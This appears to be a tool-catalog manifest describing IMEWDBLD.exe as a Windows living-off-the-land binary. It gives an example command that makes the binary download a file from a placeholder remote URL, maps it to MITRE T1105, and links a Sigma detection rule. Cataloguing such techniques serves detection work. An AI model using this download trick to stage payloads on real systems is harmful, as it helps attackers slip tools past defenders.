---
id: windows-download-imewdbld
namespace: windows:download:imewdbld
name: imewdbld
description: 'Microsoft IME Open Extended Dictionary Module Located at: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe.'
author: Wade Hickey
version: 1.0.0
capabilities:
- network.transfer.download
platforms:
- windows
risk_level: medium
trust_level: community
execution_policy: enabled
architectures:
- amd64
dependencies: []
related_tools: []
artifacts: []
workflow_edges:
  produces:
  - command-output
  consumes: []
contract:
  inputs: []
  outputs:
  - type: process.output
    description: Command execution output
  side_effects:
  - network_traffic
  resource_cost:
    cpu: low
    memory_mb: 16
    network: medium
    disk_io: low
resource_profile:
  cpu: low
  memory_mb: 16
  network: medium
  disk_io: low
allowed-tools:
- imewdbld
parameters: []
features:
- network-intensive
- pipes-stdout
execution:
  template: imewdbld
  sandbox: execFile
  timeout_seconds: 30
  shell: false
global_vars: {}
examples:
- description: IMEWDBLD.exe attempts to load a dictionary file, if provided a URL
    as an argument, it will download the file served at by that URL and save it to
    INetCache. (Download file from Internet)
  command: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe {REMOTEURL}
references:
- label: '1367493406835040265'
  url: https://twitter.com/notwhickey/status/1367493406835040265
techniques:
- exfiltration
mitre_ids:
- T1105
detections:
- type: sigma
  url: https://github.com/SigmaHQ/sigma/blob/bea6f18d350d9c9fdc067f93dde0e9b11cc22dc2/rules/windows/network_connection/net_connection_win_imewdbld.yml
install:
- method: choco
  package_name: imewdbld
  commands:
  - choco install imewdbld
---

# imewdbld

imewdbld is a Windows LOLBin. Microsoft IME Open Extended Dictionary Module Located at: C:\Windows\System32\IME\SHARED\IMEWDBLD.exe.
